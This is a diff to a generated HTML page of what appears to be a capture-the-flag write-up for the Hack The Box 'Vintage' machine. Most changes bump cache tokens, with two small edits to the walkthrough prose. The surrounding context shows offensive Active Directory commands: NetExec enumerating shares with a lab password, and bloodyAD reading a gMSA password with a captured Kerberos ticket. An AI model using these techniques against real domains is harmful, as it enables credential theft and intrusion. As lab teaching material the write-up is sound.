@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799084971022">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799692556314">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.7.0">
@@ -32,12 +32,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.7.0.799084971022" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.7.0.799692556314" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799084971022" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799692556314" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -283,7 +283,7 @@ L.Bianchi_adm</code></pre>
         <span>Kerberos Authentication</span>
     </h3>
 </doc-anchor-target>
-<p>After using some common queries over ldap, I decided to retry using NetExec with the <code v-pre>-k</code> flag which uses Kerberos as authentication protocol instead of NTLM (default).</p>
+<p>After using some common queries over ldap, I decided to retry using NetExec with the <code v-pre>-k</code> flag which uses Kerberos as authentication protocol instead of NTLM (default). When dealing with Kerberos, you generally don&#x27;t want to use IP addresses and use hostnames instead.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
@@ -354,7 +354,7 @@ Password:fs01
         <span>ReadGMSAPassword Abuse</span>
     </h3>
 </doc-anchor-target>
-<p>There are several methods we can use to read this password, but the easiest method is to use <code v-pre>BloodyAD.py</code>. Again we need to do our authentication over Kerberos by using the TGT of <code v-pre>FS01$</code>.</p>
+<p>There are several methods we can use to read this password, but the easiest method is to use <code v-pre>BloodyAD</code>. Again we need to do our authentication over Kerberos by using the TGT of <code v-pre>FS01$</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k ccache=FS01$.ccache --host dc01.vintage.htb -d &quot;VINTAGE.HTB&quot; --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword
 
